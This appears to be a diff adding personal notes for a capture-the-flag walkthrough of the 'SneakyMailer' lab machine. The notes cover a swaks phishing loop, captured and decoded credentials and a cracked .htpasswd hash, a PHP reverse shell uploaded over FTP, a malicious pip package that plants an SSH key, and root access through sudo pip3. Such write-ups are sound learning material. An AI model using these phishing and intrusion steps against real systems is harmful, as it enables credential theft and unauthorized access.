@@ -1,0 +1,100 @@
+- Running nmap...
+
+	21/tcp   open  ftp      vsftpd 3.0.3
+	22/tcp   open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+	25/tcp   open  smtp     Postfix smtpd --> Intresting
+	80/tcp   open  http     nginx 1.14.2
+	143/tcp  open  imap     Courier Imapd (released 2018) --> Intresting
+	993/tcp  open  ssl/imap Courier Imapd (released 2018)
+	8080/tcp open  http     nginx 1.14.2 
+
+	Both smtp and imap look rather intresting considering that the name of the
+	machine is SneakyMailer and also they are a bit uncommon in HTB machines.
+
+
+- Trying connecting to ftp as anonymous user yields back nothing
+
+
+- Enumarating web server on port 80 for interesting dirs
+	
+	Accessing port 80 needs to add http://sneakycorp.htb/ in /etc/hosts
+	
+	One intersting thing we notice on index page is the message "It is now possible to install modules with pip on our servers"
+	
+	Going on the /team.php page we get a list of users with a bunch more info per user
+
+	Enumarating gets us the pypi dir which is 403 but if we further enumarate pypi we also get /register.php (Propably a rabbit hole)
+
+	
+- Trying to connect to imap -p 143 with some of the user emails i found
+
+	To start a connection with imap -> nc 10.10.10.197 143
+	
+	To try to login issue command -> tag* login user@gmail.com password   (* A character sequence before each IMAP command)
+	(good reference on https://tewarid.github.io/2011/05/10/access-imap-server-from-the-command-line-using-openssl.html)
+	
+	using swaks we send messages to all the emails with the notion the phis someone
+
+	while read mail; do swaks --to $mail --from it@sneakymailer.htb --header "Subject: Credentials /Errors" --body "goto http://{local-Ip}/" --server 10.10.10.197; done < mails.txt
+
+	hopefully someone clicks on the email message (Need to test that this is it)
+
+	We get the message below:
+	firstName=Paul&lastName=Byrd&email=paulbyrd%40sneakymailer.htb&password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt
+
+	Url decode gives us:
+	firstName=Paul&lastName=Byrd&email=paulbyrd@sneakymailer.htb&password=^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht&rpassword=^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht
+
+
+- Connecting to the email using Evolution we can see the following two emails.
+	
+	"Hello administrator, I want to change this password for the developer account 
+		Username: developer
+		Original-Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C
+	Please notify me when you do it"
+
+	"Hello low
+	Your current task is to install, test and then erase every python module you 
+	find in our PyPI service, let me know if you have any inconvenience."
+
+
+- Using the credentials we can log in the ftp server
+
+  Upload a php reverse shell on the server accessible from the dev.sneakycorp.htb/ subdomain
+  
+
+- Looking arround we find pypi.sneakycorp.htb dir
+
+  inside there is a .htpasswd that contains a hash
+  pypi:$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/
+
+- Using hashcat we crack the hash
+
+  hashcat -m 1600 pypihash /usr/share/wordlists/rockyou.txt  
+  $apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/:soufianeelhaoui
+
+- According to pypi.sneakycorp.htb we have a pypiserver 
+  https://pypi.org/project/pypiserver/1.1.2/#pip
+
+  Following the instructions from the link we see that we can create 
+  a custom package, as we have the password for the server
+
+  ** Remember to set HOME=$(pwd) for .pypirc to work **
+
+  python3 setup.py sdist upload -r bigra
+
+  So we create a .pypirc file and and a setup.py file to add
+  our ssh key to the server on user low. Then connect with ssh
+
+
+ [We got the user flag]
+
+
+ - Running sudo -l to see if user 'low' has any special previleges 
+
+	User low may run the following commands on sneakymailer:
+    (root) NOPASSWD: /usr/bin/pip3
+
+	GTFObins for the root
+
+[We got the root flag]
